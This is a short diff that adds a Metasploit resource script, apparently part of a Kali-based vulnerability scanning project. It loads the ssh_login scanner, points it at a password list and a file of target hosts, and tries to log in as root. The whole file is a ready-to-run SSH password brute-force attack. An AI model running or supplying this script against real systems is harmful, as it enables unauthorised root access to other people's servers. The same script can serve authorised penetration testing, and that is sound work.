@@ -1,0 +1,6 @@
+use auxiliary/scanner/ssh/ssh_login
+set PASS_FILE /home/kali/scripting/customVA/pass
+set RHOSTS file:/home/kali/scripting/server/ssh_port.txt
+set username root
+run
+exit -y
